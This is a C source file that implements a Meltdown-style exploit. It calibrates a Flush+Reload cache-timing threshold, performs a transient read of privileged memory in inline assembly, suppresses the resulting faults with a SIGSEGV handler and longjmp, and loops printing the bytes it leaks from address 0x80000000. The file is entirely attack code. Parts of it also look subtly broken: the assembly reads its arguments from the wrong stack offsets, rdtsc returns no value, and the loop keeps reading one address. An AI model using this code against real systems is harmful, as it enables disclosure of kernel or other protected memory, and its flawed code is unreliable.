#include <cpuid.h>
#include <errno.h>
#include <fcntl.h>
#include <memory.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>



size_t cache_miss_threshold = 0; /**< Cache miss threshold in cycles for Flush+Reload */
int measurements = 10; /**< Number of measurements to perform for one address */
int accept_after = 1; /**< How many measurements must be the same to accept the read value */
int retries = 10000; /**< Number of Meltdown retries for an address */
char *mem = NULL, *_mem = NULL;
static size_t phys = 0;
char *TestString = "ABCD";
static jmp_buf buf;
int val;


static inline size_t rdtsc(){
  asm volatile(
    ".intel_syntax noprefix \n"
    "_rdtsc: \n"
    "mfence \n"
    "lfence \n"
    "rdtscp \n"
    "lfence \n"
  );
}


static inline void maccess(void *p){
  asm volatile(
    ".intel_syntax noprefix \n"
    "_maccess: \n"
    "enter 0,0 \n"
    "mov rax, [rbp+8] \n"
    "leave \n"
  );
}


static inline void flush(void *p){
  asm volatile(
    ".intel_syntax noprefix \n"
   "_flush: \n"
    "enter 0,0 \n"
    "clflush [rbp+8] \n"
    "leave \n"
  );
}



void calc_cache_threshold(){
  size_t reload_time = 0, flush_reload_time = 0, count = 1000000;
  size_t dummy[64];
  size_t *ptr = dummy + 8;
  size_t start = 0, end = 0;

  maccess(ptr);
  for(int i = 0 ; i< count ; i++){
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    reload_time += (end-start);
  }
  for(int i = 0; i<count; i++){
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    flush(ptr);
    flush_reload_time += (end-start);
  }

  reload_time /= count;
  flush_reload_time /= count;

  cache_miss_threshold = (flush_reload_time + reload_time*2)/3;
}

int Flush_Reload(void *ptr){
size_t start = 0, end = 0;

start = rdtsc();
maccess(ptr);
end = rdtsc();

flush(ptr);
/*                                         */
if(end  - start < cache_miss_threshold){
  return 1;
}
  return 0;
}

static void Meltdown(size_t p1, void *p2){
  asm volatile(
    ".intel_syntax noprefix \n"
    "_Meltdown: \n"
    "enter 0,0 \n"
    "mov rcx, [rbp+8] \n"
    "mov rbx, [rbp+12] \n"
    "mov rax, [rcx] \n"
    "shl rax, 0xc \n"
    "mov rbx, [rbx+rax] \n"
    "leave \n"
  );
}


  static void unblock_signal(int signum __attribute__((__unused__))) {
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
  }

  static void segfault_handler(int signum) {
    (void)signum;
    unblock_signal(SIGSEGV);
    longjmp(buf,1);
    }

int __attribute__((optimize("-Os"), noinline)) READ() {
  retries++;
while(retries--){
 if(!setjmp(buf)){
  signal(SIGSEGV,segfault_handler);
  Meltdown(phys,mem);
 }

    for(int i = 0 ; i < 256 ; i++){
      if(Flush_Reload(mem + i*4096)){
        if(i>=1){
          return i;
        }
      }
    }
  }
return 0;
}


int __attribute__((optimize("-O0"))) Read(size_t addr){
  phys = addr;

  char prope[256];
  for(int i = 0; i< 256; i++){
    prope[i]=0;
  }

  for(int i=0;i<measurements;i++){
    int val = READ();
    prope[val]++;
  }

  int max_v = 0, max_i = 0;

  for (int i = 1; i< 256; i++){
    if (prope[i] > max_v && prope[i] > accept_after){
      max_v = prope[i];
      max_i = i;
    }
  }
  return max_i;
}


__attribute__((visibility("default"))) int main() {

    _mem = malloc(4096 * 300);
    mem = (char *)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
    memset(mem, 0xab, 4096 * 290);
    for (int j = 0; j < 256; j++) {
      flush(mem + j * 4096);
    }

  calc_cache_threshold();
  printf("%ld\n",cache_miss_threshold);

    size_t addr = 0x80000000;

  while (1) {
    int value = Read(addr);
    printf("%c\n", value);
    fflush(stdout);
    phys++;
  }
  free(_mem);

  return 0;
}
